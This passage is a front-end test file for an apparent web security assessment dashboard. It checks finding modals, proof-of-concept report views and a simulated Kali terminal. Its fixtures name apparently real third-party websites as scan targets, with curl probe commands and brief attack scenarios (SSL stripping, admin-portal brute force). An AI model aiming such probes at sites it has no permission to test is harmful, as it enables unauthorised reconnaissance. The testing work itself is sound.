import React from 'react';
import { render, screen, fireEvent, act } from '@testing-library/react';
// Vitest globals (describe, it, expect, vi) are provided globally via vite.config.ts
import { Navbar } from '../components/Navbar';
import { FindingDetailModal } from '../components/FindingDetailModal';
import { OverviewTab } from '../components/OverviewTab';
import { ProofOfConceptTab } from '../components/ProofOfConceptTab';
import { KaliTerminal } from '../components/KaliTerminal';
import { LiveScanTerminal } from '../components/LiveScanTerminal';
import { SQLTab } from '../components/SQLTab';
import {
  getAssessmentTerminalState,
  setAssessmentTerminalState,
  clearAssessmentTerminalState,
} from '../utils/assessmentTerminalStore';
import { api } from '../services/api';
import type { Finding, AuthorizedAsset, ScanJob } from '../types/api';

describe('Navbar Component', () => {
  it('renders branding and version badge', () => {
    const setActiveTab = vi.fn();
    const setIsSimulatedMode = vi.fn();

    render(
      <Navbar
        activeTab="overview"
        setActiveTab={setActiveTab}
        systemHealth={{ status: 'healthy', version: '0.1.0' }}
        isSimulatedMode={false}
        setIsSimulatedMode={setIsSimulatedMode}
      />
    );

    expect(screen.getByText('OWASP Sentinel')).toBeInTheDocument();
    expect(screen.getByText('v0.1.0')).toBeInTheDocument();
    expect(screen.getByText('API Online')).toBeInTheDocument();
    expect(screen.getByText('LIVE ASSESSMENT MODE')).toBeInTheDocument();
  });

  it('displays simulation warning banner when in simulation mode', () => {
    const setActiveTab = vi.fn();
    const setIsSimulatedMode = vi.fn();

    render(
      <Navbar
        activeTab="overview"
        setActiveTab={setActiveTab}
        systemHealth={{ status: 'healthy', version: '0.1.0' }}
        isSimulatedMode={true}
        setIsSimulatedMode={setIsSimulatedMode}
      />
    );

    expect(screen.getByText('[SIMULATION ACTIVE]')).toBeInTheDocument();
  });

  it('switches tab on click', () => {
    const setActiveTab = vi.fn();
    const setIsSimulatedMode = vi.fn();

    render(
      <Navbar
        activeTab="overview"
        setActiveTab={setActiveTab}
        systemHealth={{ status: 'healthy', version: '0.1.0' }}
        isSimulatedMode={false}
        setIsSimulatedMode={setIsSimulatedMode}
      />
    );

    const findingsBtn = screen.getByText('OWASP Findings');
    fireEvent.click(findingsBtn);
    expect(setActiveTab).toHaveBeenCalledWith('findings');
  });

  it('triggers theme toggle when button is clicked', () => {
    const setActiveTab = vi.fn();
    const setIsSimulatedMode = vi.fn();
    const onToggleTheme = vi.fn();

    render(
      <Navbar
        activeTab="overview"
        setActiveTab={setActiveTab}
        systemHealth={{ status: 'healthy', version: '0.1.0' }}
        isSimulatedMode={false}
        setIsSimulatedMode={setIsSimulatedMode}
        theme="dark"
        onToggleTheme={onToggleTheme}
      />
    );

    const themeBtn = screen.getByRole('button', { name: /toggle theme/i });
    expect(themeBtn).toBeInTheDocument();
    fireEvent.click(themeBtn);
    expect(onToggleTheme).toHaveBeenCalledTimes(1);
  });
});

describe('FindingDetailModal Component', () => {
  const mockFinding: Finding = {
    id: 'fnd-1234567890',
    target_id: 'asset-001',
    initial_scan_id: 'scan-001',
    last_scan_id: 'scan-001',
    rule_id: 'RULE-SEC-001',
    technical_issue_type: 'MISSING_HSTS_HEADER',
    title: 'Missing Strict-Transport-Security (HSTS) Header',
    description: 'The target server does not send the HSTS header.',
    severity: 'MEDIUM',
    confidence: 'HIGH',
    validation_status: 'CONFIRMED',
    remediation_guidance: 'Add Strict-Transport-Security: max-age=31536000; includeSubDomains to responses.',
    references: ['https://owasp.org/www-project-top-ten/'],
    evidence: { missing_header: 'Strict-Transport-Security' },
    status_history: [
      {
        from_status: 'POTENTIAL',
        to_status: 'CONFIRMED',
        timestamp: '2026-10-29T12:00:00Z',
        actor: 'Engine',
        note: 'Verified presence in response',
      },
    ],
    first_seen_at: '2026-10-29T12:00:00Z',
    last_seen_at: '2026-10-29T12:00:00Z',
    category_mappings: [
      {
        id: 'map-1',
        finding_id: 'fnd-1234567890',
        edition_identifier: '2021',
        category_identifier: 'A05:2021',
        justification: 'Security Misconfiguration: Transport layer encryption policy missing.',
      },
    ],
  };

  it('renders technical details and evidence cleanly', () => {
    const onClose = vi.fn();
    const onStatusUpdated = vi.fn();

    render(
      <FindingDetailModal
        finding={mockFinding}
        onClose={onClose}
        onStatusUpdated={onStatusUpdated}
      />
    );

    expect(screen.getAllByText('Missing Strict-Transport-Security (HSTS) Header').length).toBeGreaterThan(0);
    expect(screen.getByText('RULE-SEC-001')).toBeInTheDocument();
    expect(screen.getAllByText('A05:2021').length).toBeGreaterThan(0);
    expect(screen.getByText('"Security Misconfiguration: Transport layer encryption policy missing."')).toBeInTheDocument();
  });

  it('renders real backend HSTS finding without crashing or throwing errors', () => {
    const realHstsFinding: Finding = {
      id: "e8052f87-3f61-4ce8-9c30-067e4a6c3d67",
      target_id: "7ab33489-7e6f-4c86-92c6-f8e31fc4f307",
      scan_id: "5bc0aa58-155f-4c49-a86e-24fd716e90d3",
      rule_id: "RULE-SEC-001",
      technical_issue_type: "MISSING_HSTS_HEADER",
      title: "Missing HTTP Strict Transport Security (HSTS) Header",
      severity: "MEDIUM",
      confidence: "CERTAIN",
      validation_status: "CONFIRMED",
      first_seen_at: "2026-11-19T11:36:38.504817+00:00",
      last_seen_at: "2026-11-19T11:36:38.504817+00:00",
      evidence: {
        scheme: "https",
        header: "Strict-Transport-Security",
        status: "missing",
        practical_proof: {
          proof_type: "MISSING_SECURITY_HEADER_PROOF",
          target_endpoint: "https://www.alrahdenhotel.com/E/index.php",
          header_or_field: "Strict-Transport-Security",
          test_executed: "Dispatched live non-destructive HTTP probe to https://www.alrahdenhotel.com/E/index.php (www.alrahdenhotel.com:443)",
          live_server_response: "HTTP/1.1 502 Bad Gateway (3 headers received) in 3069.7ms from 84.46.251.243",
          assertion_tested: "OWASP Verification: Missing HTTP Strict Transport Security (HSTS) Header",
          test_methodology: "RFC 6797 §5.2 Strict Transport Security Audit & OWASP ASVS v4.0.3 Item 14.4.1",
          reproduction_cli: 'curl -s -D - -o /dev/null "https://www.alrahdenhotel.com/E/index.php" | grep -i "strict-transport-security"',
          verification_command: 'curl -s -D - -o /dev/null "https://www.alrahdenhotel.com/E/index.php" | grep -i "strict-transport-security"',
          reproduction_expected_output: "# Expected Output: Empty output (Exit code 1 - Header is absent from server response)",
          exploit_scenario: "1. A client accesses http://www.alrahdenhotel.com on a local wireless.\n2. Attacker launches SSL stripping.\n3. HSTS absent.\n4. Session harvested.",
          observed_finding: "Target www.alrahdenhotel.com:443 returned HTTP response headers without 'Strict-Transport-Security'.",
          expected_standard: "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
          security_impact: "Browsers do not enforce HTTPS for this origin, leaving client sessions exposed to SSL stripping.",
          remediation_code: 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;',
          diff_marker: "[-] Strict-Transport-Security: <MISSING - NOT RETURNED BY SERVER>",
        },
        raw_request: "GET /E/index.php HTTP/1.1\nhost: www.alrahdenhotel.com\n",
        raw_response_status: "HTTP/1.1 502 Bad Gateway",
        raw_response_headers: {
          "content-type": "text/html; charset=UTF-8",
          connection: "close",
          "content-length": "40",
        },
        network_recon: {
          resolved_ip: "84.46.251.243",
          port: 443,
          scheme: "https",
          latency_ms: 3069.65,
          tls_version: null,
          tls_cipher: null,
          http_version: "HTTP/1.1",
        },
      },
      category_mappings: [
        {
          id: "map-1",
          finding_id: "e8052f87-3f61-4ce8-9c30-067e4a6c3d67",
          edition_identifier: "2025",
          category_identifier: "A02:2025",
          justification: "Security Misconfiguration",
        },
      ],
    };

    const { container } = render(
      <FindingDetailModal
        finding={realHstsFinding}
        onClose={vi.fn()}
        onStatusUpdated={vi.fn()}
      />
    );

    // Verify modal overlay covers full viewport with modal-dimmed-backdrop and no sidebar-offset clips
    const backdrop = container.firstElementChild as HTMLElement;
    expect(backdrop.className).toContain('modal-dimmed-backdrop');
    expect(backdrop.className).toContain('fixed inset-0 z-50');
    expect(backdrop.className).not.toContain('md:left-64');
    expect(backdrop.className).not.toContain('lg:left-72');

    expect(container.textContent).toContain("Missing HTTP Strict Transport Security (HSTS) Header");
    expect(container.textContent).toContain("https://www.alrahdenhotel.com/E/index.php");
    expect(container.textContent).toContain("curl -s -D - -o /dev/null");
  });

  it('resolves exact vulnerable path for EXPOSED_ADMIN_PORTAL (/wp-login.php) with high contrast', () => {
    const adminFinding: Finding = {
      id: "fnd-admin-01",
      target_id: "asset-01",
      initial_scan_id: "scan-01",
      last_scan_id: "scan-01",
      rule_id: "KALI:PRACTICE:auth_failures_py",
      technical_issue_type: "EXPOSED_ADMIN_PORTAL",
      title: "Publicly Exposed Administrative Login Portal (/wp-login.php)",
      severity: "MEDIUM",
      confidence: "CERTAIN",
      validation_status: "CONFIRMED",
      first_seen_at: "2026-11-20T10:00:00Z",
      last_seen_at: "2026-11-20T10:00:00Z",
      evidence: {
        portal_path: "/wp-login.php",
        vulnerable_url: "http://www.sceindia.org/wp-login.php",
        status_code: 200,
        how_found: "1. Dispatched live probe to http://www.sceindia.org/wp-login.php\n2. Target server returned HTTP 200",
        what_found: "[VULNERABLE ENDPOINT] http://www.sceindia.org/wp-login.php\n[EXPOSED PATH] /wp-login.php\n[HTTP STATUS] 200 OK",
        practical_proof: {
          proof_type: "ADMIN_PORTAL_EXPOSURE",
          target_endpoint: "http://www.sceindia.org/wp-login.php",
          vulnerable_url: "http://www.sceindia.org/wp-login.php",
          observed_finding: "Target http://www.sceindia.org/wp-login.php exposed active administrative portal",
          reproduction_cli: 'curl -i -s "http://www.sceindia.org/wp-login.php" | grep -i "login"',
          security_impact: "Enables unauthenticated administrative login discovery and brute force attacks",
        },
      },
      category_mappings: [
        {
          id: "map-admin-1",
          finding_id: "fnd-admin-01",
          edition_identifier: "2025",
          category_identifier: "A07:2025",
          justification: "Identification and Authentication Failures",
        },
      ],
    };

    const { container } = render(
      <FindingDetailModal
        finding={adminFinding}
        onClose={vi.fn()}
        onStatusUpdated={vi.fn()}
      />
    );

    const backdrop = container.firstElementChild as HTMLElement;
    expect(backdrop.className).toContain('modal-dimmed-backdrop');
    expect(backdrop.className).not.toContain('md:left-64');
    expect(container.textContent).toContain("Publicly Exposed Administrative Login Portal (/wp-login.php)");
    expect(container.textContent).toContain("http://www.sceindia.org/wp-login.php");
    expect(container.textContent).toContain("[EXPOSED PATH] /wp-login.php");
  });
});

describe('OverviewTab Component', () => {
  const mockAssets: AuthorizedAsset[] = [
    {
      id: 'asset-01',
      scope_grant_id: 'scope-01',
      canonical_url: 'https://dev-portal.acme.com',
      port: 443,
      scheme: 'https',
      approval_status: 'APPROVED',
    },
  ];

  const mockScans: ScanJob[] = [];
  const mockFindings: Finding[] = [];

  it('navigates to targets tab when Authorized Targets card is clicked', () => {
    const onNavigateToTab = vi.fn();
    const onSelectTarget = vi.fn();

    render(
      <OverviewTab
        assets={mockAssets}
        scans={mockScans}
        findings={mockFindings}
        onSelectTarget={onSelectTarget}
        onNavigateToTab={onNavigateToTab}
      />
    );

    const authorizedTargetsCard = screen.getByRole('button', { name: /authorized targets/i });
    expect(authorizedTargetsCard).toBeInTheDocument();
    fireEvent.click(authorizedTargetsCard);

    expect(onNavigateToTab).toHaveBeenCalledWith('targets');
  });
});

describe('ProofOfConceptTab Component', () => {
  const mockAssets: AuthorizedAsset[] = [
    {
      id: 'asset-01',
      scope_grant_id: 'scope-01',
      canonical_url: 'https://dev-portal.acme.com',
      hostname: 'dev-portal.acme.com',
      port: 443,
      scheme: 'https',
      approval_status: 'APPROVED',
    },
  ];

  const mockFindings: Finding[] = [
    {
      id: 'fnd-101',
      target_id: 'asset-01',
      initial_scan_id: 'scan-01',
      last_scan_id: 'scan-01',
      rule_id: 'RULE-SEC-001',
      technical_issue_type: 'MISSING_HSTS_HEADER',
      title: 'Missing Strict-Transport-Security (HSTS) Header',
      description: 'The target server does not send the HSTS header.',
      severity: 'HIGH',
      confidence: 'HIGH',
      validation_status: 'CONFIRMED',
      remediation_guidance: 'Enforce HSTS in web server configuration.',
      evidence: {
        practical_proof: {
          proof_type: 'SECURITY_ASSERTION_PROOF',
          target_endpoint: 'https://dev-portal.acme.com',
          header_or_field: 'Strict-Transport-Security',
          assertion_tested: 'HSTS enforcement',
          observed_finding: 'Header missing from wire response',
          expected_standard: 'Strict-Transport-Security: max-age=31536000; includeSubDomains',
          security_impact: 'Vulnerable to SSL stripping and MITM attacks',
          reproduction_cli: 'curl -i -s -k -X GET "https://dev-portal.acme.com"',
          reproduction_expected_output: 'No Strict-Transport-Security header',
          exploit_scenario: '1. Attacker intercepts plaintext HTTP traffic.\n2. Downgrades transport encryption.',
          remediation_code: 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;',
        },
      },
      category_mappings: [
        {
          id: 'map-101',
          finding_id: 'fnd-101',
          edition_identifier: '2025',
          category_identifier: 'A02:2025',
          justification: 'Security Misconfiguration',
        },
      ],
    },
  ];

  it('shows target selection screen and does NOT show severities or posture score when no target is selected', () => {
    render(
      <ProofOfConceptTab
        assets={mockAssets}
        findings={mockFindings}
        scans={[]}
      />
    );

    expect(screen.getByText('Proof of Concept Advisory')).toBeInTheDocument();
    expect(screen.getByText('Select Target Asset to Inspect Proof of Concept')).toBeInTheDocument();
    expect(screen.getByText('-- Select Target Asset --')).toBeInTheDocument();

    // Verify severities and posture score are NOT rendered
    expect(screen.queryByText(/POSTURE ASSESSMENT SCORE/i)).not.toBeInTheDocument();
    expect(screen.queryByText(/Confirmed Active Findings/i)).not.toBeInTheDocument();
    expect(screen.queryByText('Missing Strict-Transport-Security (HSTS) Header')).not.toBeInTheDocument();

    // Export buttons should be disabled
    const pdfBtn = screen.getByRole('button', { name: /download pdf/i });
    expect(pdfBtn).toBeDisabled();

    const printBtn = screen.getByRole('button', { name: /print \/ preview/i });
    expect(printBtn).toBeDisabled();

    const wordBtn = screen.getByRole('button', { name: /export word \(\.doc\)/i });
    expect(wordBtn).toBeDisabled();
  });

  it('renders PoC suite with empirical wire proof, reproduction command, and export options when target is selected', () => {
    const printSpy = vi.spyOn(window, 'print').mockImplementation(() => {});

    render(
      <ProofOfConceptTab
        assets={mockAssets}
        findings={mockFindings}
        scans={[]}
        selectedTargetId="asset-01"
      />
    );

    expect(screen.getByText('Proof of Concept Advisory')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /download pdf/i })).toBeEnabled();
    expect(screen.getByRole('button', { name: /print \/ preview/i })).toBeEnabled();
    expect(screen.getByRole('button', { name: /export word \(\.doc\)/i })).toBeEnabled();
    expect(screen.getByText('Copy Markdown')).toBeInTheDocument();
    expect(screen.getAllByText('Missing Strict-Transport-Security (HSTS) Header').length).toBeGreaterThan(0);
    expect(screen.getByText('curl -i -s -k -X GET "https://dev-portal.acme.com"')).toBeInTheDocument();

    const printBtn = screen.getByRole('button', { name: /print \/ preview/i });
    fireEvent.click(printBtn);
    expect(printSpy).toHaveBeenCalled();
    printSpy.mockRestore();

    // Verify non-IT / Plain-English features
    expect(screen.getByText('Executive Briefing: What Non-Technical Leadership Needs to Know')).toBeInTheDocument();
    expect(screen.getByText('Plain-English Explanation (For Non-Technical Stakeholders)')).toBeInTheDocument();
    expect(screen.getAllByText(/Real-World Analogy:/i).length).toBeGreaterThan(0);
    expect(screen.getByText('Executive & Non-IT View')).toBeInTheDocument();

    // Switch to Executive / Non-IT View
    const execBtn = screen.getByText('Executive & Non-IT View');
    fireEvent.click(execBtn);
    expect(screen.getByText('View Deep Technical Wire Telemetry')).toBeInTheDocument();

    // Verify "All Targets" option is present in selector
    expect(screen.getAllByText(/All Authorized Targets/i).length).toBeGreaterThan(0);
    expect(screen.getByRole('button', { name: /all targets/i })).toBeInTheDocument();
  });

  it('seamlessly preserves active scanning state and delegates to onTriggerScan across tabs', () => {
    const onTriggerScan = vi.fn();

    // Render ProofOfConceptTab with an active background scan in progress
    const { rerender } = render(
      <ProofOfConceptTab
        assets={mockAssets}
        findings={mockFindings}
        scans={[]}
        selectedTargetId="asset-01"
        activeScanningTargetId="asset-01"
        scanStatusMessage="Collecting empirical evidence from dev-portal.acme.com across all 19 OWASP rules..."
        onTriggerScan={onTriggerScan}
      />
    );

    // Verify scan in progress UI is displayed without restarting
    expect(screen.getByText(/Collecting empirical evidence from dev-portal.acme.com/i)).toBeInTheDocument();
    expect(screen.getByText('Scanning...')).toBeInTheDocument();

    // Rerender as if switching tabs and coming back
    rerender(
      <ProofOfConceptTab
        assets={mockAssets}
        findings={mockFindings}
        scans={[]}
        selectedTargetId="asset-01"
        activeScanningTargetId="asset-01"
        scanStatusMessage="Still scanning in background..."
        onTriggerScan={onTriggerScan}
      />
    );

    expect(screen.getByText(/Still scanning in background.../i)).toBeInTheDocument();
    expect(screen.getByText('Scanning...')).toBeInTheDocument();
  });

  it('switches between all three Audience Presentation formats (DUAL, EXECUTIVE, TECHNICAL) with distinct tailored headers and views', () => {
    render(
      <ProofOfConceptTab
        assets={mockAssets}
        findings={mockFindings}
        scans={[]}
        selectedTargetId="asset-01"
      />
    );

    // Initial state: DUAL view
    expect(screen.getByText('PROOF OF CONCEPT (PoC) VULNERABILITY DOSSIER (DUAL VIEW)')).toBeInTheDocument();
    expect(screen.getByText('Download PDF (.pdf)')).toBeInTheDocument();
    expect(screen.getByText('Executive Briefing: What Non-Technical Leadership Needs to Know')).toBeInTheDocument();
    expect(screen.getByText('curl -i -s -k -X GET "https://dev-portal.acme.com"')).toBeInTheDocument();
    expect(screen.getByText('Plain-English Explanation (For Non-Technical Stakeholders)')).toBeInTheDocument();

    // 1. Switch to Executive & Non-IT View
    const execBtn = screen.getByRole('button', { name: /executive & non-it view/i });
    fireEvent.click(execBtn);

    expect(screen.getByText('PROOF OF CONCEPT — EXECUTIVE RISK ADVISORY (NON-IT)')).toBeInTheDocument();
    expect(screen.getByText('Download Executive PDF')).toBeInTheDocument();
    expect(screen.getByText('Export Executive Word')).toBeInTheDocument();
    expect(screen.getByText('Print Executive Advisory')).toBeInTheDocument();
    expect(screen.getByText('Copy Executive MD')).toBeInTheDocument();
    expect(screen.getByText(/Active Mode: Non-IT Executive Briefing/i)).toBeInTheDocument();
    expect(screen.getByText('Plain-English Explanation (For Non-Technical Stakeholders)')).toBeInTheDocument();
    // In Executive view, raw curl command should be hidden by default
    expect(screen.queryByText('curl -i -s -k -X GET "https://dev-portal.acme.com"')).not.toBeInTheDocument();
    expect(screen.getByText('View Deep Technical Wire Telemetry')).toBeInTheDocument();

    // 2. Switch to Technical Auditor View
    const techBtn = screen.getByRole('button', { name: /technical auditor view/i });
    fireEvent.click(techBtn);

    expect(screen.getByText('PROOF OF CONCEPT — TECHNICAL AUDITOR DOSSIER (IT)')).toBeInTheDocument();
    expect(screen.getByText('Download Technical PDF')).toBeInTheDocument();
    expect(screen.getByText('Export Technical Word')).toBeInTheDocument();
    expect(screen.getByText('Print Technical Dossier')).toBeInTheDocument();
    expect(screen.getByText('Copy Technical MD')).toBeInTheDocument();
    expect(screen.getByText(/Active Mode: Technical Dossier/i)).toBeInTheDocument();
    expect(screen.getByText('Technical Scope & Empirical Verification Parameters (IT Auditor)')).toBeInTheDocument();
    // In Technical view, cURL command and wire telemetry are visible
    expect(screen.getByText('curl -i -s -k -X GET "https://dev-portal.acme.com"')).toBeInTheDocument();
    // Plain-English explanation box is omitted in Technical view
    expect(screen.queryByText('Plain-English Explanation (For Non-Technical Stakeholders)')).not.toBeInTheDocument();

    // 3. Switch back to Dual View
    const dualBtn = screen.getByRole('button', { name: /dual view/i });
    fireEvent.click(dualBtn);

    expect(screen.getByText('PROOF OF CONCEPT (PoC) VULNERABILITY DOSSIER (DUAL VIEW)')).toBeInTheDocument();
    expect(screen.getByText('Download PDF (.pdf)')).toBeInTheDocument();
    expect(screen.getByText('Plain-English Explanation (For Non-Technical Stakeholders)')).toBeInTheDocument();
    expect(screen.getByText('curl -i -s -k -X GET "https://dev-portal.acme.com"')).toBeInTheDocument();
  });

  it('strictly contains and renders all 11 enterprise VAPT PoC report sections in exact required order', () => {
    render(
      <ProofOfConceptTab
        assets={mockAssets}
        findings={mockFindings}
        scans={[]}
        selectedTargetId="asset-01"
      />
    );

    // 1. Subject Line
    expect(screen.getByText('SUBJECT LINE:')).toBeInTheDocument();
    expect(screen.getByText('[P2] VAPT PoC: Missing Strict-Transport-Security (HSTS) Header on dev-portal.acme.com')).toBeInTheDocument();

    // 2. Subline
    expect(screen.getByText('SUBLINE:')).toBeInTheDocument();
    expect(screen.getByText('Empirical Wire Evidence, Vector Verification & Remediation for MISSING_HSTS_HEADER')).toBeInTheDocument();

    // 3. Reporting To
    expect(screen.getByText('REPORTING TO:')).toBeInTheDocument();
    expect(screen.getByText('Chief Information Security Officer (CISO) & Application Security Engineering Committee')).toBeInTheDocument();

    // 4. Confidentiality
    expect(screen.getByText('CONFIDENTIALITY:')).toBeInTheDocument();
    expect(screen.getByText('RESTRICTED // AUDIT ONLY')).toBeInTheDocument();

    // 5. Priority
    expect(screen.getByText('PRIORITY:')).toBeInTheDocument();
    expect(screen.getAllByText('P2 - HIGH (Urgent 72h Remediation)').length).toBeGreaterThan(0);

    // 6. VAPT Classification
    expect(screen.getByText('VAPT CLASSIFICATION:')).toBeInTheDocument();
    expect(screen.getByText(/OWASP Web Application Penetration Testing/i)).toBeInTheDocument();

    // 7. Proof Dossier (Proof: SS & URL)
    expect(screen.getByText('PROOF DOSSIER: PROOF: SS & URL')).toBeInTheDocument();
    expect(screen.getByText('Proof: URL (Target Endpoint):')).toBeInTheDocument();
    expect(screen.getByText('https://dev-portal.acme.com')).toBeInTheDocument();
    expect(screen.getByText('Proof: SS (Screenshot / Wire Evidence Capture):')).toBeInTheDocument();
    expect(screen.getByText(/WIRE CAPTURE SNAPSHOT/i)).toBeInTheDocument();
    expect(screen.getByText(/Deterministic Shell Reproduction Command/i)).toBeInTheDocument();
    // Confirm Proof: Video has been completely removed
    expect(screen.queryByText(/Proof: Video/i)).not.toBeInTheDocument();

    // 8. Problem Faced
    expect(screen.getByText('Problem Faced (Exact Defect & Control Deficiency)')).toBeInTheDocument();
    expect(screen.getAllByText(/Header missing from wire response/i).length).toBeGreaterThan(0);

    // 9. Example
    expect(screen.getByText('Example (Real-World Adversarial Exploitation Scenario)')).toBeInTheDocument();
    expect(screen.getByText(/Attacker intercepts plaintext HTTP traffic/i)).toBeInTheDocument();

    // 10. Solution
    expect(screen.getByText('Solution (Production Hardening Directives & Architecture Fix)')).toBeInTheDocument();
    expect(screen.getAllByText('add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;').length).toBeGreaterThan(0);

    // 11. Work
    expect(screen.getByText('Work (Engineering & Operational Implementation Tasks)')).toBeInTheDocument();
    expect(screen.getByText(/Configuration Hardening Deployment/i)).toBeInTheDocument();
    expect(screen.getByText(/Service Syntax Validation & Zero-Downtime Reload/i)).toBeInTheDocument();

    // Full Screenshot Preview Modal Test
    const viewSsBtn = screen.getByRole('button', { name: /view full screenshot preview/i });
    fireEvent.click(viewSsBtn);

    expect(screen.getByText(/SNAPSHOT TELEMETRY OVERVIEW/i)).toBeInTheDocument();

    // Close Modal via aria-label
    const closeSsBtn = screen.getByRole('button', { name: /close screenshot/i });
    fireEvent.click(closeSsBtn);
    expect(screen.queryByText(/SNAPSHOT TELEMETRY OVERVIEW/i)).not.toBeInTheDocument();
  });
});

describe('KaliTerminal Component', () => {
  const mockAssets: AuthorizedAsset[] = [
    {
      id: 'asset-01',
      scope_grant_id: 'scope-01',
      canonical_url: 'https://dev-portal.acme.com',
      hostname: 'dev-portal.acme.com',
      port: 443,
      scheme: 'https',
      approval_status: 'APPROVED',
    },
  ];

  it('renders authentic Kali Linux terminal interface with prompt, target env, and script controls', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    expect(screen.getAllByText('root@kali:').length).toBeGreaterThan(0);
    expect(screen.getAllByText('~/target-assessment').length).toBeGreaterThan(0);
    expect(screen.getByText('Kali Terminal')).toBeInTheDocument();
    expect(screen.getAllByText(/root㉿kali/i).length).toBeGreaterThan(0);
    expect(screen.getByText('Load Script (.py)')).toBeInTheDocument();
    expect(screen.getByText('$TARGET_URL:')).toBeInTheDocument();
    expect(screen.getByText('$TARGET_HOST:')).toBeInTheDocument();
    expect(screen.getByText('$TARGET_PORT:')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /practice_scripts \(407\)/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Advanced-Penetration-Testing-Script/i })).toBeInTheDocument();
  });

  it('executes help command and displays manual and target environment variables', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    const input = screen.getByPlaceholderText(/Enter Kali command/i);
    fireEvent.change(input, { target: { value: 'help' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    expect(screen.getByText(/KALI LINUX TARGET ASSESSMENT TERMINAL - QUICK GUIDE:/i)).toBeInTheDocument();
    expect(screen.getByText(/AUTOMATIC TARGET ENVIRONMENT VARIABLES:/i)).toBeInTheDocument();
  });

  it('opens Practice_Scripts library drawer with 407 scripts, categories, and stages a script', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    // Toggle Practice_Scripts drawer
    const libBtns = screen.getAllByRole('button', { name: /practice_scripts \(407\)/i });
    fireEvent.click(libBtns[0]);

    // Verify library drawer is open
    expect(screen.getByText('~/target-assessment/Practice_Scripts')).toBeInTheDocument();
    expect(screen.getByText('407 Security Assessment Scripts')).toBeInTheDocument();
    expect(screen.getByText(/407 modular scripts • 0 subdirectories/i)).toBeInTheDocument();

    // Verify search input
    const searchInput = screen.getByPlaceholderText(/Search 407 scripts/i);
    expect(searchInput).toBeInTheDocument();

    // Stage a script
    const stageBtns = screen.getAllByTitle(/Stage command into terminal prompt/i);
    expect(stageBtns.length).toBeGreaterThan(0);
    fireEvent.click(stageBtns[0]);

    // Command input should have staged script
    const input = screen.getByPlaceholderText(/Enter Kali command/i) as HTMLInputElement;
    expect(input.value).toMatch(/^python Practice_Scripts\//);
  });

  it('opens Advanced-Penetration-Testing-Script library drawer, lists .py scripts, and stages command', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    // Toggle Advanced-Penetration-Testing-Script drawer
    const advBtns = screen.getAllByRole('button', { name: /Advanced-Penetration-Testing-Script/i });
    expect(advBtns.length).toBeGreaterThan(0);
    fireEvent.click(advBtns[0]);

    // Verify drawer header and scripts
    expect(screen.getByText('~/target-assessment/Advanced-Penetration-Testing-Script')).toBeInTheDocument();
    expect(screen.getByText(/Penetration Testing \.py Scripts/i)).toBeInTheDocument();
    expect(screen.getByText('scanner.py')).toBeInTheDocument();
    expect(screen.getByText('penetration_testing3.py')).toBeInTheDocument();

    // Verify drawer tools and scripts
    expect(screen.getByText(/Netwatch Cyberpunk & Quickhack Pentest Engines/i)).toBeInTheDocument();

    // Stage an advanced script
    const stageBtns = screen.getAllByTitle(/Stage command into terminal prompt/i);
    expect(stageBtns.length).toBeGreaterThan(0);
    fireEvent.click(stageBtns[0]);

    const input = screen.getByPlaceholderText(/Enter Kali command/i) as HTMLInputElement;
    expect(input.value).toMatch(/Advanced-Penetration-Testing-Script/);
  });

  it('navigates directories with cd, pwd, and lists categories with ls Practice_Scripts', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    const input = screen.getByPlaceholderText(/Enter Kali command/i);

    // Run 'ls Practice_Scripts'
    fireEvent.change(input, { target: { value: 'ls Practice_Scripts' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    expect(screen.getByText(/407 scripts in ~\/target-assessment\/Practice_Scripts/i)).toBeInTheDocument();

    // Run 'cd Practice_Scripts'
    fireEvent.change(input, { target: { value: 'cd Practice_Scripts' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    // Run 'pwd'
    fireEvent.change(input, { target: { value: 'pwd' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    expect(screen.getByText('/root/target-assessment/Practice_Scripts')).toBeInTheDocument();
  });

  it('authentically handles bash cd to files, rm deletion, touch creation, and synchronized ls directory listings', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    const input = screen.getByPlaceholderText(/Enter Kali command/i);

    // 1. Initial ls shows header_audit.py and 060826.py
    fireEvent.change(input, { target: { value: 'ls' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });
    expect(screen.getAllByText(/header_audit\.py/).length).toBeGreaterThan(0);
    expect(screen.getAllByText(/060826\.py/).length).toBeGreaterThan(0);

    // 2. cd into a file produces standard Linux bash error
    fireEvent.change(input, { target: { value: 'cd header_audit.py' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });
    expect(screen.getByText('bash: cd: header_audit.py: Not a directory')).toBeInTheDocument();

    // 3. rm header_audit.py removes the file
    fireEvent.change(input, { target: { value: 'rm header_audit.py' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    // 4. ls now strictly excludes header_audit.py
    fireEvent.change(input, { target: { value: 'ls' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });
    const terminalLogs = screen.getAllByText(/total \d+/i);
    const lastLs = terminalLogs[terminalLogs.length - 1];
    expect(lastLs.textContent).toContain('060826.py');
    expect(lastLs.textContent).not.toContain('header_audit.py');

    // 5. touch test_exploit.py adds the file
    fireEvent.change(input, { target: { value: 'touch test_exploit.py' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    fireEvent.change(input, { target: { value: 'ls' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });
    expect(screen.getAllByText(/test_exploit\.py/).length).toBeGreaterThan(0);
  });

  it('navigates command history with Up/Down arrows and completes commands/paths with Tab', () => {
